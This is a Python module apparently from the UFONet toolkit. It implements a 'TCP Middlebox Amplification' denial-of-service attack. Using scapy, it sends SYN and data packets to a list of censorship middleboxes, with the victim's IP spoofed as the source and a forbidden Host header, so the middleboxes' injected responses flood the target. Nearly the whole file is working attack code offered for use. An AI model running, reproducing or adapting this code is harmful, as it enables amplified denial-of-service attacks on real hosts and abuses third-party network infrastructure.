#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

middlebox_file = "botnet/middlebox.txt"

# UFONet TCP Middlebox Amplification (CENSORSHIP) - amp factor >65000x
# abuses stateless censorship middleboxes that inject HTTP responses for forbidden hosts

FORBIDDEN_HTTP_REQ = (
    b'GET / HTTP/1.1\r\n'
    b'Host: www.youporn.com\r\n'
    b'\r\n'
)

def censorshipize(target_ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(middlebox_file)
        if _empty:
            print("[Error] [AI] [CENSORSHIP] botnet/middlebox.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("CENSORSHIP", middlebox_file, kind="middlebox")
            return
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [CENSORSHIP] Triggering 'middlebox' ["+str(n)+"] via forbidden Host header! -> [SLOWING!]")
            for r in reflectors:
                try:
                    sport = random.randint(2000, 65535)
                    seq = random.randint(1000, 0xffffffff)
                    syn = IP(dst=r, src=target_ip) / TCP(sport=sport, dport=80, flags='S', seq=seq)
                    send(syn, verbose=0)
                    psh = IP(dst=r, src=target_ip) / TCP(sport=sport, dport=80, flags='PA', seq=seq+1, ack=1) / Raw(load=FORBIDDEN_HTTP_REQ)
                    send(psh, verbose=0)
                    print("[Info] [AI] [CENSORSHIP] Triggered 'middlebox' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except Exception:
                    print("[Info] [AI] [CENSORSHIP] Triggered 'middlebox' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [CENSORSHIP] Failing to engage... -> Is still target online? -> [Checking!]")

class MIDDLEBOX(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] TCP Middlebox Amplification (CENSORSHIP) is ready to fire: [", rounds, "middleboxes ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except Exception:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [CENSORSHIP] Targeting 'localhost' -> [OK!]\n")
            return
        censorshipize(ip, rounds)
